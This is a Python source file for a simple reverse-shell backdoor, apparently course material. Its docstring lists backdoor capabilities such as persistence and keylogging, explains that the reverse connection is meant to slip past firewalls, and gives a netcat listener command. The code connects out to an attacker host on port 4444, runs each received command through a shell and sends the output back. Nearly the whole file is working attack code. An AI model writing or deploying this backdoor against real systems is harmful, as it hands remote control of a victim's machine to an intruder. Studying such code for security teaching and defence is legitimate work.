"""
A simple backdoor program.

Reverse backdoor:
    Listening for incoming connections on a specific port
    1. Access file system
    2. Execute system commands
    3. Download files
    4. Upload files
    5. Persistence
    
Backdoor:
    Interactive program gives access to system its executed on.
        1. Command execution
        2. Access file system
        3. Upload/Download files
        4. Run keylogger
        ...
 
Why do we use reverse connection:       
    1. Bind/Direct Connection is easy to be detected by the firewall 
    
Need to run following command in host machine to listen from incoming connection
    nc -vv -l -p 4444
"""
import socket
import subprocess


def execute_system_command(command):
    """
    Execute a system command.

    :param command: command that we want to execute
    :type command: str
    :return: resulting command 
    :rtype: str
    """
    return subprocess.check_output(command, shell=True)


if __name__ == "__main__":
    # TODO: set ip_address to local ip address
    ip_address = ""
    connection = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    # (ip of destination, port opened in target)
    connection.connect((ip_address, 4444))

    # send data
    connection.send("\n[+] Connection established.\n")

    # receive data
    while True:
        received_command = connection.recv(1024)
        # execute command
        command_result = execute_system_command(received_command)
        connection.send(command_result)

    connection.close()
